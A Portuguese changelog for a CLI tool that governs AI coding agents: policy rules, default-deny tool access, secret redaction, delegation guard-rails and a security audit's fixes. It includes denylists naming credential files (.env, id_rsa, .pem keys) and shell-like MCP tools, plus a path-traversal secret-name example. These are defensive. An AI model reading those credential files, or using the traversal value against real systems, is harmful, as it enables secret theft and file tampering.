### Release Gate Observável e Controlável (PRD 20 Sprint 20.1)

`verify --profile release` deixa de ficar mudo por minutos e de orfanar processos.
Agora é observável, tem timeout por etapa e cleanup — confiável para usuário e CI.

- **`src/util/exec-step.js`** (novo): `runStepProcess` roda uma etapa de gate com
  **timeout POR ETAPA** e, no estouro, mata a ÁRVORE de processos reusando
  `killTreeCommand` do runtime supervisor (Windows `taskkill /T /F`; POSIX grupo via
  `detached`). Captura stdout/stderr resumidos e distingue TIMEOUT de falha. `spawn`/
  `killer` injetáveis (testável sem processo real).
- **`verify.progress.jsonl` incremental**: cada etapa é emitida a um sink que faz
  append em `.gstack/runs/<runId>/verify.progress.jsonl` + reescreve um `verify.json`
  PARCIAL — dá pra ver em qual gate está, ao vivo. Best-effort, nunca derruba o run.
- **Status distintos** (PRD20 20.1): `timed_out` (etapa estourou o tempo, filhos
  encerrados) é diferente de `blocked` (gate falhou). Ambos ≠ `ready`/`ready_with_warnings`.
- **`verify --profile release --dry-run --json`**: lista os comandos do profile
  (`deps/lint/typecheck/test/build/qg-l1/qg-l2`) **sem executar nada** (rápido).
- **`--json` puro** preservado (progresso vai só para o arquivo); ícone `⏱` no humano.
- **Dívida de complexidade REDUZIDA** (encaixe do PRD20 20.2): ao tornar o verify
  observável, `runVerify` caiu de cc62→59 e `verifyCommand` de cc44→35 (extração de
  `planVerifySteps`/`buildCmdStep`/gates internos e dos handlers changed-files/dry-run).
  Blockers CRITICAL/HIGH do Fallow: 65→64. Zero introduzidos.
- Testes: `verify_release_observable` (tree-kill no timeout, dry-run não executa,
  `timed_out`≠`blocked`, sink incremental) + e2e `verify --dry-run`. 604/604 verde.

## [3.49.0] - 2026-07-03

### Terminal E2E + Release/Docs/I18n (PRD 18 Sprint 9 — fecha o PRD18)

Fecha a fase com testes caixa-preta e onboarding claro: o projeto precisa ser
fácil de entender, não só poderoso.

- **Terminal E2E (caixa-preta)** em `tests/e2e/`: `doctor_terminal` (JSON puro,
  conformance, candidates/ruflo read-only), `start_terminal` (dry-run não escreve
  nada + policy doctor + context scout), `dev_terminal` (dev/verify sem crash,
  resposta honesta), `delegate_terminal` (nada roda sem consentimento; candidato
  exige worktree). Runner `scripts/test-terminal-e2e.mjs` + `npm run test:e2e:terminal`.
- **Docs/i18n**: `.docs/QUICKSTART.md` (PT), `README.en.md` (EN), `.docs/GLOSSARY.md`
  (harness, gate, policy, worktree, provenance, scout, runtime, ledgers, candidate,
  delegate, Lite vs Complete), `.docs/ARCHITECTURE.md`, `.docs/RELEASE.md` (disciplina:
  matriz verde 3-OS antes de publicar).
- **ADRs** (`.docs/ADRS/`): 001 adapter-vs-fork, 002 LLM advisory vs gate determinístico,
  003 segurança do Lite, 004 cloud handoff explícito, **005 precedência de policy
  `deny > allow > ask > default`** (registro da divergência consciente vs prosa do PRD15,
  conferida contra `src/policy/schema.js`).
- 595/595 verde (inclui E2E), QG 0.

## [3.48.0] - 2026-07-03

### Tool Catalog Security + External Tools Opt-In (PRD 18 Sprint 8)

A camada `tools` ganha SEGURANÇA: origem, risco, provenance e opt-in explícito —
sem instalar pacotes remotos por default.

- **`src/tools/catalog.js`** (novo): `annotateCatalogEntry` marca cada tool com
  origem (`local/bundled/remote`), risco determinístico (`classifyRisk`: remoto=medium,
  remoto+MCP/rede=high), enforcement (`advisory` — tool não é gate), `installCommand`
  SUGERIDO (nunca executado), `mcpCompanionOptIn:true`, `autoInstall:false`,
  `provenanceRequired` p/ remotas. `LOCAL_CATALOG` funciona offline.
- **`src/tools/skill-scanner.js`** (novo): `scanSkill` BLOQUEIA caminho absoluto
  (portabilidade/vazamento de layout) e secret embutido; `bulkInstallAllowed()=false`
  (skills nunca em massa — uma a uma, scanner antes da sugestão forte).
- **`src/tools/provenance.js`** (novo): `recordToolProvenance`/`readToolProvenance` —
  toda install/skip de tool remota vira recibo (hash-chain VFA) com origem e risco.
- **`tools catalog [--json]`** (novo): catálogo anotado, offline, JSON puro.
  **`tools list --json`** passa a emitir itens anotados (risco/origem). **`tools install`**
  de fonte remota agora EXIGE confirmação (`--yes` ou TTY); não-interativo sem `--yes`
  recusa e grava provenance de skip. MCP companion nunca ativa sem opt-in.
- Testes: `tools_catalog` (risco/origem, JSON puro offline), `tools_provenance`
  (recibo tool:*, best-effort), `printing_press_optin` (MCP opt-in, install exige
  confirmação, scanner bloqueia path/secret). 585/585, QG 0.

## [3.47.0] - 2026-07-03

### Ruflo Adapter Minimal (PRD 18 Sprint 7)

PRD16 conservador: Ruflo entra como adapter OPCIONAL (executor, não fonte de
verdade), **nunca instalado por default**, `full init` nunca automático.

- **`src/harness/ruflo.js`** (novo): descritor + `detectRuflo` READ-ONLY (fail-open —
  ausência nunca quebra o GStack). `buildRufloReport` (presente/ausente, plugin-lite,
  `fullInitRecommended:false`, canais, MCP policy).
  - **MCP DEFAULT-DENY**: `rufloMcpDecision` nega por padrão; nega explicitamente
    `terminal/system/agent_spawn/swarm_init/workflow_delete/autopilot/memory_store/
    federation` (e substrings, ex.: `system_exec`); só a allowlist explícita passa.
  - **Canais**: só `core` (read-only) é default; `agents`/`federation` são sensíveis
    e opt-in — o usuário escolhe ao ativar.
- **`src/agents/adapter-matrix.js`**: `CANDIDATE_ADAPTERS.ruflo` (executor); NÃO entra
  no `ADAPTER_MATRIX` iterado — conformance segue limpo.
- **`doctor --ruflo [--json]`** e **`tools ruflo [--json]`**: READ-ONLY; mostram
  canais + MCP default-deny; nada é instalado.
- Testes: `harness_ruflo` (executor, plugin-lite, fail-open, canais, doctor JSON),
  `ruflo_policy` (default-deny, substrings perigosas, allowlist explícita). 577/577, QG 0.

## [3.46.0] - 2026-07-03

### Codebuff/Freebuff Bridges + Delegate (PRD 18 Sprint 6)

Delegação SEGURA para candidatos externos, com trilha fechada: worktree
obrigatória → contexto sem secrets → provenance → **verify determinístico final**.

- **`src/harness/candidate-bridge.js`** (novo): `runCandidateBridge` com regras
  inegociáveis — worktree OBRIGATÓRIA (nunca toca o branch principal); `.env*`
  rastreado BLOQUEIA; contexto project-scoped seguro (`knowledge.md` redigido +
  `.<id>ignore` derivado da policy, sempre bloqueando `.env*/*.pem/*.key/secrets/`);
  metadados em `.gstack/harness/<id>.json`; NADA global. O reviewer externo é
  ADVISORY — o **verify roda DEPOIS** e é o gate final (falhou → conclusão IMPEDIDA).
  - `acceptanceGate`: Freebuff exige aceite de disclosure na 1ª vez; `--yes` NÃO
    pula (persistido em `.gstack/harness/freebuff-accepted.json`).
- **`src/commands/delegate.js`**: novos alvos `codebuff`/`freebuff`. Sem `--worktree`
  → recusa; imprime disclosure; `--accept-disclosure` para o aceite; provenance
  registrada; render honesto (needs_acceptance / review_ready / verify_failed).
- Testes: `codebuff_bridge` (ignore bloqueia .env, knowledge sem secret, verify
  final, falha impede), `delegate_codebuff` (worktree obrigatória, .env bloqueia,
  provenance), `delegate_freebuff` (--yes não pula disclosure, aceite persiste). 570/570, QG 0.

## [3.45.0] - 2026-07-03

### Codebuff/Freebuff Detector/Doctor (PRD 18 Sprint 5)

Codebuff e Freebuff entram como **candidatos externos OPT-IN** — detectados e
reportados, **nunca instalados automaticamente**, nunca em `lite`.

- **`src/harness/codebuff.js`** / **`src/harness/freebuff.js`** (novos): descritores
  honestos + detecção READ-ONLY (config/binário; fail-open, sem efeito colateral).
  Ambos são `advisory_reviewer` (reviewer, NUNCA gate final), `externalModelRisk` e
  `networkRequired`. Freebuff com disclosure REFORÇADO (rede externa mesmo parecendo
  grátis, anúncios, modelos externos) e `requiresAcceptance` (aceite na 1ª vez).
- **`src/harness/candidates.js`** (novo): `buildCandidateReport` agrega os dois +
  checa ambiente — `shellCompat` (no Windows exige Git Bash **ou** WSL p/ delegate),
  `envReadiness` (node/npm/proxy). Relatório `readonly:true`, `autoInstall:false`;
  cada candidato traz risco, disclosure e `delegateBlocked` com mensagem útil.
- **`src/agents/adapter-matrix.js`**: novo `CANDIDATE_ADAPTERS` + `isCandidateAdapter`
  com os eixos `candidate_adapter`/`advisory_reviewer`/`external_model_risk`/
  `network_required`. Candidatos NÃO entram no `ADAPTER_MATRIX` (não contaminam
  install/conformance de harnesses instaláveis — o conformance segue limpo).
- **`doctor --candidates [--json]`**: READ-ONLY. Presente/ausente, riscos, disclosure
  e bloqueio de delegate no Windows sem shell compatível.
- Testes: `harness_codebuff` (reviewer advisory, fora da matrix, doctor JSON puro),
  `harness_freebuff` (aceite/disclosure, nunca enforcement, shell coerente). 559/559, QG 0.

## [3.44.0] - 2026-07-03

### Evidence Task Ledger + Resume/Handoff (PRD 18 Sprint 4)

`no proof, no done`. Um ledger de evidência por task ensina o sistema a saber o
que foi **provado**, retomar de onde parou e entregar handoff humano quando para.

- **`src/project-plan/evidence-ledger.js`** (novo): `.gstack/tasks/<taskId>/evidence.jsonl`
  (recibos) + `TASK.md` (espelho humano). Cada recibo tem objetivo/ação/comando/
  resultado/evidência/status (`proved|failed|pending|not_applicable|advisory`).
  - **Regra dura**: só uma FONTE determinística (`gate/test/build/verify/command`)
    marca `proved`; LLM/review é rebaixado a `advisory` (registrado, NUNCA prova).
  - `taskComplete` = `no proof, no done`: precisa de ≥1 prova e nada `failed`/`pending`.
  - **Redação obrigatória**: secrets redigidos (`redactSecrets`) e valores truncados
    (400 chars) — o ledger nunca grava segredo nem output bruto.
- **`src/project-plan/stopping-rules.js`** (estendido): `resumeIndex` (pula
  proved/not_applicable/advisory, volta ao 1º failed/pending), `shouldStop`
  (complete/hard_cap/blocked) — puros, sem I/O.
- **`src/project-plan/evidence-loop.js`** (novo): `runEvidenceLoop` roda passos com
  RETOMADA + HARD CAP. `runStep` injetável. Passo `failed` sempre interrompe; hard
  cap fecha em handoff (nunca loop zumbi). Distinto do `runTaskLoop` de worktree.
- **`src/project-plan/journal.js`** (estendido): `renderTaskHandoff`/`writeTaskHandoff`
  — resumo acionável com erros persistentes, pendências e arquivos tocados; sem secrets.
- **Ledger compartilhado**: o run loop (`start`) espelha cada estágio do pipeline no
  MESMO ledger da task (=`plan.id`); só `test`/`verify` (gate) provam. Novos
  subcomandos `task evidence <id> [--json]` e `task resume <id> [--json]`.
- Testes: `evidence_ledger` (regra de fonte, redação/no-secrets, complete),
  `task_loop_resume` (não repete provado, retoma failed/pending, hard cap),
  `workflow_handoff` (handoff acionável + persistência). 551/551 verde, QG 0.

## [3.43.0] - 2026-07-03

### Hook Event Conformance + Event Ledger (PRD 18 Sprint 3)

Contrato de **eventos cross-harness** e ledger local sanitizado. A matriz para
de tratar todo harness como igual: cada um DECLARA o que suporta por evento —
`enforced` (bloqueia), `partial` (mecanismo real, depende de instalação),
`advisory` (orienta/audita) ou `unsupported`. Nenhum harness instrucional pode
declarar `enforced` — a claim é rejeitada pelo conformance.

- **`src/harness/events.js`** (novo): contrato de 8 eventos normalizados
  (`session.start/stop`, `message.output`, `tool.before/after`, `mcp.call`,
  `file.write`, `command.exec`) + `EVENT_DECLARATIONS` HONESTAS por harness
  (Claude real_hooks, Cursor/OpenCode partial, Codex/Devin, instrucionais
  Gemini/Copilot/Windsurf/Kiro nunca enforced, Hermes MCP-partial).
  - **Event ledger** `.gstack/events/events.jsonl` (append-only): `recordHarnessEvent`
    valida o nome do evento (evento fora do contrato é REJEITADO), remove campos
    proibidos (`prompt/transcript/env/token/secret/password/apikey/…`), redige
    secrets (`redactSecrets`) e trunca a 300 chars. **Nunca grava secret nem
    prompt bruto.** `readHarnessEvents` com `--limit`.
- **`src/harness/conformance.js`** (novo): `buildConformanceReport` por harness da
  adapter-matrix. Violações: `forbidden_claim` (instrucional declarando enforced,
  ou nível acima do teto do enforcement da matrix), `missing_event` (evento do
  contrato ausente = drift), `invalid_level`, `missing_declaration`. Determinístico
  e offline — a EVIDÊNCIA de instalação continua sendo papel do doctor/detector.
- **`doctor --conformance [--json] [--strict]`**: eventos por harness com
  enforced/partial/advisory + violações; `doctor --json` passa a reportar
  `conformance` compacto. Nenhum harness instrucional aparece como Zero-Trust.
- **`audit events [--json] [--limit N]`**: lê o ledger local (sanitizado).
- **Produtor real**: `pretool.js` grava `tool.before` no ledger a cada decisão
  de challenge-response (mesma decisão que já vira recibo de provenance).
- Testes: `harness_events` (contrato, sanitização/no-secrets, rejeição de evento
  inválido, `--limit`), `harness_conformance` (relatório real sem violação,
  forbidden_claim/missing_event/invalid_level), `doctor_harness_matrix`
  (`collectDoctorJson.conformance` + `doctor --conformance --json` puro).
  Cobre Claude, Cursor, OpenCode, Codex, Devin e harness instrucional.

## [3.42.0] - 2026-07-03

### Context Scout + modelPolicy (PRD 18 Sprint 2)

Subagente explorador READ-ONLY e econômico: devolve **paths + linhas + razão**,
nunca despeja arquivos. Local-first de verdade.

- **`src/context-docs/scout.js`** (novo): `context scout "<pergunta>"`.
  - Backends locais em ordem: scanner Node puro (walk+match; `rg` não é dependência) →
    SQLite/FTS dos context docs (quando o índice existe) → **Graphify**
    (`graphify-out/graph.json`, nós → `source_file`+`L<range>`). **FastContext/remoto
    NUNCA por default**: `--backend fastcontext` é recusado com erro honesto (opt-in
    explícito ainda não suportado — nenhuma chamada de rede silenciosa).
  - **`SCOUT_DENYLIST` testada**: `.env*`, `secrets/`, `.pem/.key/.dpapi`, `id_rsa*`,
    `names.json` (vault), `.git/node_modules/.gstack/graphify-out` — nem lidos, nem
    reportados (vale também para nós do Graphify).
  - Resultado: `{file, lineStart, lineEnd, reason, confidence, backend}` +
    `tokensAvoided` (estimativa DECLARADA como heurística) + keywords determinísticas
    (stopwords pt/en, sem LLM). Orçamentos duros (3000 arquivos, 512KB/arquivo, 60 hits).
- **`src/model-policy/`** (novo): `.gstack/model-policy.json` —
  `explore/review=cheap, implement=default, architecture/security=strong`.
  `resolveModel(kind)` **nunca exige modelo externo**: sem modelo configurado p/ o tier
  → `fallback: "local_deterministic"`. Arquivo inválido → default com warning, sem crash.
- **Pipeline `start`**: estágio `scout` agora é REAL — roda antes do create quando o
  projeto já existe (5 hits, tokens evitados no detail); projeto novo → `not_applicable`
  (substitui o `pending_feature` do Sprint 1). `scoutRunner` injetável p/ teste.
- **`context scout --json`** é JSON puro; inclui `modelRouting` (explore→cheap→local).
- **Testes**: `tests/context_scout.test.js` (6 — paths+linhas sem dump, denylist unidade
  e integração, graphify backend com filtro de secret, stopwords/mergeLines, JSON puro +
  recusa fastcontext, estágio scout real no pipeline) e `tests/model_policy.test.js`
  (5 — defaults, fallback local, override do usuário, corrompido→default, init idempotente).

## [3.41.0] - 2026-07-03

### Replit-like Run Loop MVP (PRD 18 Sprint 1)

`start` vira pipeline executável — `Intent → Plan → Scout → Create → Dev → Test →
Review → Verify → Preview` — REUSANDO runtime supervisor/executor/journal/verify
(nada foi recriado).

- **`src/project-plan/run-loop.js`** (novo): orquestra o pipeline.
  - Create com **hard iteration cap** (default 3) + retomada (journal pula passos
    concluídos); cap esgotado → **handoff humano** `.gstack/runs/<runId>/handoff.md`
    (acionável, sem secrets), nunca loop zumbi.
  - Gate determinístico decide: test/verify `failed` sem passo retomável → handoff
    imediato. **LLM nunca aprova** (estágio review é `advisory` sempre).
  - Estágios com status honesto: `ready|failed|pending|advisory|pending_feature|not_applicable`
    — scout é `pending_feature` (chega no Sprint 2); dev/preview distinguem projeto
    inexistente (`not_applicable`) de serviço unhealthy (`failed`) e sem URL (`pending`).
  - Artefatos por run: `.gstack/runs/<runId>/{journal.jsonl,status.json}` (só resumo,
    comandos sanitizados). `renderPlanMarkdown` gera o `plan.md` humano.
  - Dev/preview integrados ao supervisor real (`dev --json`, state de serviços, URL).
- **`src/commands/start.js`**: aceita objetivo POSICIONAL + `--name/--mode/--yes`;
  **`start --dry-run --json` é JSON PURO** (nada escrito, nada executado, comandos
  sanitizados); execução persiste `plan.json` + **`plan.md`** e roda o pipeline;
  saída humana mostra estágio a estágio + preview URL. Contrato antigo preservado
  (`{plan, result, executed}` + novo `pipeline`).
- **`verify --changed-files`** (novo, `src/project-plan/changed-files.js`): gate
  SELETIVO — `node --check` por JS alterado, roda SÓ os testes alterados, `py_compile`
  nos .py; docs-only passa sem gates de código; sem git → **fallback declarado** p/ o
  verify completo. **Não substitui** `--profile release` (segue fail-closed).
- **Testes**: `tests/start_pipeline.test.js` (6 — dry-run puro, artefatos por run,
  hard cap exato + handoff, runtime manifest → dev/preview ready, gate falhou →
  handoff) e `tests/verify_changed_files.test.js` (6 — clean/fallback/docs-only/
  seletivo/blocked/JSON puro).
- Zero escrita global; nenhum `.env` copiado; journal nunca guarda output bruto.

## [3.40.0] - 2026-07-02

### Delegate Devin (PRD 15 §10.5)

Delegação de tarefas ao Devin com os mesmos guard-rails do OpenCode + cloud handoff seguro.

- **`src/delegation/devin.js`** (`runDevinDelegation`): delega ao `devin -p -- <prompt>`
  (oneshot; modelo/Adaptive do usuário — o gstack NÃO chama modelo). `--model`,
  isolamento por `--worktree`, retenta até o `maxIterations` do loop-budget, higiene
  determinística no retorno (achado HIGH → `needs_review`), **nunca auto-merge** (preserva
  branch efêmero p/ revisão). Devin ausente → `devin_missing`; task com newline → `invalid_task`.
- **`src/commands/delegate.js`**: dispatch por target (`opencode`|`devin`).
  - **Bloqueia `.env` rastreado** (mesma regra do opencode; `--allow-tracked-secrets` p/ liberar).
  - **`--cloud-handoff`** (só devin): aviso explícito + **confirmação humana obrigatória** —
    nem `--yes` pula; em não-interativo, **nada é enviado**. Registra o consentimento no provenance.
  - **Provenance** de toda delegação (`delegate:<target>`, task, decisão, regra cloud-handoff);
    best-effort, nunca cria raiz nova só p/ registrar.
- **Testes** `tests/devin_delegation.test.js`: devin_missing/invalid_task, oneshot com
  `-p --model -- <task>`, falha tipada (exitCode/stderr), bloqueio de `.env`, cloud handoff
  sem confirmação (não envia) e confirmado (prossegue + provenance `cloud-handoff`),
  `--cloud-handoff` recusado no opencode.

## [3.39.0] - 2026-07-02

### Devin harness adapter (PRD 15 §10)

Devin entra como harness cross oficial, **opcional e project-scoped** — nunca central,
nunca default de cloud.

- **`src/agents/adapter-matrix.js`**: entrada `devin` (`enforcement: real_hooks`,
  `generated: true`). Riscos HONESTOS: `real_hooks` só quando o Devin está instalado E os
  hooks carregam — senão o doctor faz downgrade p/ `rules_only`/`partial`; cloud handoff
  pode enviar repo/diff/contexto e sempre exige confirmação.
- **`src/harness/detector.js`**: detecção Devin **fail-open** — `%APPDATA%/devin` (Windows)
  / `~/.config/devin` (Unix) / `.devin/` (projeto) / `devin --version`.
- **`src/harness/devin.js`**: gera `.devin/` a partir da **Policy DSL** (mesma policy dos
  outros harnesses): `config.json` (permissões compiladas), `hooks.v1.json` (PreToolUse→
  `challenge classify`, PostToolUse→`audit status` — comandos REAIS, sem flags inventadas;
  advisory até haver ponte de stdin), skills `gstack-context`/`gstack-verify`/`gstack-review`
  (alto risco = `triggers: [user]`). **Nunca** toca `.devin/config.local.json`; backup
  `.gstack_vibehard.bak` de qualquer arquivo pré-existente.
- **`install --harness devin --project-only`**: gera `.devin/` mesmo sem o Devin CLI
  instalado (scaffolding project-scoped, nunca escrita global).
- **`doctor`/`agents doctor`** listam Devin via matrix/detector; guia
  `docs/guides/harness-matrix.md` atualizado com o nível honesto.
- **Testes** `tests/devin_adapter.test.js`: matrix, detector por SO, geração
  config(policy)+hooks+skills, compilação da policy efetiva do projeto, preservação de
  `config.local.json` + backup.

## [3.38.0] - 2026-07-02

### Policy DSL cross-harness + config em camadas (PRD 15 §7.1/§7.2/§7.6)

Uma policy canônica que COMPILA para cada harness com nível de aplicação honesto.

- **`src/policy/schema.js`**: DSL `.gstack/policy.json` com `permissions.{allow,deny,ask}`,
  alvos tipados `Read(**)`/`Write(...)`/`Exec(...)`/`mcp__<server>__<tool>`, globs `*`/`**`.
  - Precedência **`deny > allow > ask > default`** — `deny` sempre vence; um `allow`
    específico auto-aprova (senão o catch-all `ask`, ex.: `exec`, sombrearia toda a
    allowlist); `ask` pega o resto; sem regra → default seguro. (Semântica real de
    Devin/Claude; o exemplo default do PRD15 §10.3 só é coerente com allow antes de ask —
    divergimos da prosa numerada do PRD que dizia ask>allow, pois ela tornava a allowlist
    inútil.)
  - `validatePolicy` **rejeita segredo embutido** (a policy versiona padrões, nunca valores).
- **`src/policy/compiler.js`**: `compilePolicy(policy, harness)` → nível **honesto** por
  enforcement (`real_hooks`=enforced, `partial`=partial, `rules_only`/`instructional`/
  `detection_only`=advisory). Harness instrucional recebe a policy mas NUNCA é rotulado
  Zero-Trust; artefato `permissions` (Devin-like) ou `rules_markdown`.
- **`src/policy/layers.js`**: config em camadas — `config.json`/`policy.json` (time,
  versionado) ← `config.local.json`/`policy.local.json` (pessoal, gitignored). Local
  sobrepõe/exceção. `localsGitignored` detecta locais fora do `.gitignore`.
- **`src/commands/policy.js`** (novo comando `policy`): `init` (cria policy.json + conserta
  .gitignore), `show`, `eval "<alvo>"`, `compile [--harness X]`, `doctor` — todos `[--json]`.
- **Testes** `tests/policy_dsl.test.js`: precedência, globs/mcp namespaced, rejeição de
  segredo, compilação honesta por harness, camadas, gitignore-guard, ciclo init→doctor→eval.

## [3.37.0] - 2026-07-02

### OpenCode "config is sacred" — clean-machine recovery (PRD 15 P0)

Corrige o incidente de máquina limpa em que consolidar `opencode.jsonc` (com OAuth/
providers/models) sumia com provedores e modelos do OpenCode.

- **`src/installer/opencode-jsonc.js`**: a config do usuário é sagrada.
  - `planOpenCodeFix` ganha a ação **`preserve`**: se o `.jsonc` contém chaves sensíveis
    (`OPENCODE_SENSITIVE_KEYS` = provider/providers/model/models/plugin/plugins/auth/oauth/
    account/token/key/credentials), o GStack **NUNCA** consolida nem renomeia — o `.jsonc`
    é a fonte de verdade. `merge` só é possível quando o `.jsonc` é seguro.
  - `applyOpenCodeFix(home, { apply })`: **dry-run é o default**; consolidar exige `apply:true`.
    A ação `preserve` é **recusada** mesmo com `apply`.
  - `restoreOpenCodeJsonc`: reverte `.jsonc.gstack-disabled` deixado por versões antigas
    (backup do `.jsonc` ativo antes; nunca apaga config do usuário).
  - `diagnoseOpenCode`: relatório read-only (chaves sensíveis por NOME, risco de shadowing,
    resíduo disabled) — nunca vaza valores.
- **`doctor --fix opencode`**: dry-run por default; `--apply` (+ confirmação) para consolidar;
  `preserve` explica o risco sem tocar no disco; `--restore-jsonc` reverte resíduo antigo.
  **`doctor --opencode [--json]`**: novo diagnóstico read-only.
- **`verify --profile release`**: Fallow/QG deixa de ser opcional — sem o gate, o release
  **falha-fechado** (Quality Gate real não pode ser pulado no perfil de publicação).
- **Testes** invertidos: `tests/opencode_jsonc_doctor.test.js` agora valida `preserve`
  (jsonc sensível intocável), merge-só-seguro-com-apply, restore, diagnose sem vazamento e
  **E2E de máquina limpa** (jsonc com codex-auth+providers+models permanece byte-for-byte).

## [3.36.0] - 2026-07-02

### Auditoria de Segurança (Principal Security Engineer) + prontidão macOS/Linux VPS

Auditoria da camada lógica (auth/authz, input validation, data security, business logic).
Deliverable completo em `.docs/AUDITS/security-audit-v3.36.md` — 8 achados (0 Critical),
por achado: arquivo:linha, severidade, explicação e fix. Acionáveis corrigidos com testes.

**Corrigidos neste sprint:**
- **SEC-02 (Medium) — path traversal via nome de segredo.** `src/secrets/broker.js`: allowlist
  `^[A-Za-z_][A-Za-z0-9_]*$` (`assertValidSecretName`) em set/get/delete; `resolveSecrets` ignora
  nome hostil de schema em vez de traversar. Impedia `secrets set ..\..\evil` gravar blob DPAPI
  fora do vault no Windows. Regressão em `tests/secrets.test.js`.
- **SEC-03 (Medium) — temp previsível para script remoto.** `src/cli/create.js`: `safeDownloadAndRun`
  usa `mkdtempSync` (dir privado, 0700 no POSIX) em vez de `gstack-dl-<Date.now()>` — fecha janela
  TOCTOU/symlink num `/tmp` compartilhado.
- **SEC-04 (Low) — nome de projeto traversal/dotfile.** `src/cli/create.js`: rejeita `.`, `..`, `...`
  e nomes iniciados por ponto (`.git`/`.gstack`/`.env`) após o allowlist. Regressão em
  `tests/create_command.test.js`.
- **SEC-01 (macOS) — segredo do Keychain em argv.** `src/secrets/providers.js`: docstring corrigido
  (não sobre-promete "STDIN-only") + comentário do resíduo conhecido. Fix de código (`security -i`)
  recomendado no audit, não aplicado às cegas sem macOS para não regredir o armazenamento existente.

**Documentados (SEC-05..08):** defaults fracos em scaffolds gerados (`admin/123`, `postgres:postgres`,
bind `0.0.0.0`), blocklist de comando do hook contornável (postura advisory declarada), backend cru
do State Store interpola tabela (guardado pelo wrapper allowlist), redação best-effort.

**Prontidão macOS/Linux VPS:** novo `docs/guides/vps-ubuntu.md` — requisitos mínimos, degradação
honesta do broker de segredos headless (keychain ausente), `node:sqlite`→`jsonl_fallback` em Node < 22.5,
TTY-detection nos wizards. CI já cobre matriz ubuntu/windows/macos (Node 18/20/22).

## [3.35.0] - 2026-07-02

### Auto-dream learning seguro (PRD 14 Sprint 13)

- **`src/dream/learning.js`**: continuous learning determinístico e SEGURO. `dream aprende de runs REAIS via provenance` mas NUNCA se auto-promove:
  - `createProposal` — lição/skill draft extraída dos recibos do run (sem LLM, sem invenção); toda proposta carrega `provenance` (runId + hash da cadeia).
  - `promoteProposal` — exige `--reviewed` (review humano explícito) E AgentShield builtin limpo; CRÍTICO bloqueia (`blocked_shield`). Grava SÓ em staging `.gstack/dream/promoted`, nunca no corpus.
  - `FORBIDDEN_TARGETS = [core, knowledge, agents/agents]` — auto-learning nunca escreve no corpus; mover para lá é decisão humana + `agents build`.
  - `rejectProposal` / `learningSummary` — ciclo de vida completo (proposed/promoted/rejected/blocked_shield).
- **`src/commands/dream.js`**: subcomandos `learn --from-run <id>`, `propose-skill --from-run <id>`, `promote <id> --reviewed`, `reject <id>`, `proposals`, `status` (agora com bloco Learning). Dispatch via tabela `SUBCOMMANDS`.
- **Testes**: `tests/dream_learning.test.js` (6) — provenance obrigatório, run inexistente → `run_not_found`, promote sem review → `needs_review`, AgentShield bloqueia injection antes de promover, staging não toca core/knowledge/agents, reject conta por status.
- Provenance: promoção registra recibo `dream:promote` (human-reviewed + agentshield-builtin).

## [3.34.0] - 2026-07-02

### Supply Chain Doctor (PRD 14 Sprint 12)
Fontes oficiais viram GATE verificável — não só aviso no README.
- **`doctor --supply-chain [--json]`** (novo, `src/installer/supply-chain.js`): checagens offline-first e determinísticas — registry npm (mirror não oficial = **critical**, "risco de malware"); binários críticos (node/npm/git/python) e opcionais (bun/uv/fallow/headroom/ecc/opencode) no PATH com **detecção de PATH hijack** (binário resolvido em temp/cwd = critical); allowlist de downloads remotos (remote-policy) e fontes oficiais do produto declaradas. Schema `gstack.supplychain.v1`, risco agregado `none|low|high` (`--strict` + high → exit≠0).
- **`install --audit-only` inclui supply chain risk** no preflight (criticals detalhados; nunca quebra o preflight).
- Honestidade: npm indisponível = warning declarado (nunca OK falso); binário opcional ausente = ok.
- 6 testes novos (mirror, PATH hijack, npm quebrado, ausências, agregação de risco).

## [3.33.0] - 2026-07-02

### State Store operacional + GSTACK_AGENT_DATA_HOME (PRD 14 Sprint 11)
Estado project-scoped em SQLite para sessões, runs, serviços, worktrees, governança, gates, decisões e work items — sem nunca gravar segredo.
- **`src/state/{store,schema,migrations}.js`** (novos): `.gstack/state.db` via `node:sqlite` (Node ≥22.5) com **fallback JSONL declarado** (`backend: "jsonl_fallback"`, mesma API — nunca OK falso em Node 18/20). Migrações idempotentes versionadas em `gstack_meta`.
- **Guard de redação POR CONSTRUÇÃO**: chaves proibidas (token/secret/password/cookie/env/transcript...) nunca persistem; valor com segredo detectável vira `***REDACTED***`; strings gigantes são truncadas (anti-transcript). Teste prova que o segredo não está nem no retorno nem no ARQUIVO.
- **`GSTACK_AGENT_DATA_HOME`** (PRD14 §4.12): isola a memória por harness/projeto — env vence; default seguro é `<projeto>/.gstack` (teste prova que nada vaza pro default quando o env aponta pra outro lugar).
- **`state summary [--json]`** (novo comando): backend, arquivo e contagem/último evento por entidade — export para o dashboard futuro.
- **Produtor real**: o executor de planos grava resumo de cada run em `workflow_runs` (best-effort — o store nunca derruba um plano). Journals existentes (`.gstack/plans/*`) intocados (aditivo, teste dedicado).
- 8 testes novos.

## [3.32.0] - 2026-07-02

### Harness Capability Matrix V2 (PRD 14 Sprint 10)
Scorecard completo por harness — não só "qual enforcement", mas COMO o suporte é entregue, o que falta, como verificar e quem é o dono.
- **`ADAPTER_MATRIX` V2** (`src/agents/adapter-matrix.js`): cada harness ganha `state` (`native|adapter_backed|instruction_backed|reference_only|unsupported`), `supportedAssets`, `unsupportedSurfaces`, `installOrOnramp`, `verificationCommands`, `riskNotes`, `lastVerifiedAt`, `owner`. API antiga preservada (getAdapterInfo/isInstructional/generatedHarnesses).
- **`src/harness/capabilities.js`** (novo): `capabilityScorecard()` + `validateScorecard()` com invariante EXECUTÁVEL — `instruction_backed`/`reference_only` reivindicando `real_hooks`/`partial` é ERRO de validação (teste de sabotagem prova).
- **`agents doctor`**: matriz V2 completa no JSON (`matrixSchema: "gstack.capability.v2"` + `scorecard`); `ok` agora exige scorecard íntegro; humano mostra state+risco+verificado+owner por harness.
- Harness desconhecido = `unsupported` com "nenhuma promessa" (default honesto).
- 4 testes novos (campos obrigatórios, invariante anti-claim-falso, unsupported, estados coerentes).

## [3.31.0] - 2026-07-02

### README multilíngue + guias (PRD 14 Sprint 9)
Landing curta estilo ECC: primeiro contato em 100 linhas, detalhe em guias, dois idiomas.
- **README raiz reescrito (100 linhas, aceite <150)**: seletor de idiomas (PT-BR/EN), pitch de 30s, seção **Official sources only** (npm/GitHub; mirrors = risco), **Pick one path only** (matriz de caminhos com `consult` como árbitro), quickstart com `start`/`consult` antes de `install`, como desfazer, e tabela de documentação com link para todo termo pesado (harness, QG, manifest, worktree, MCP, Headroom, Graphify, Fallow).
- **`docs/pt-BR/README.md`**: guia completo em português (o README detalhado anterior, preservado).
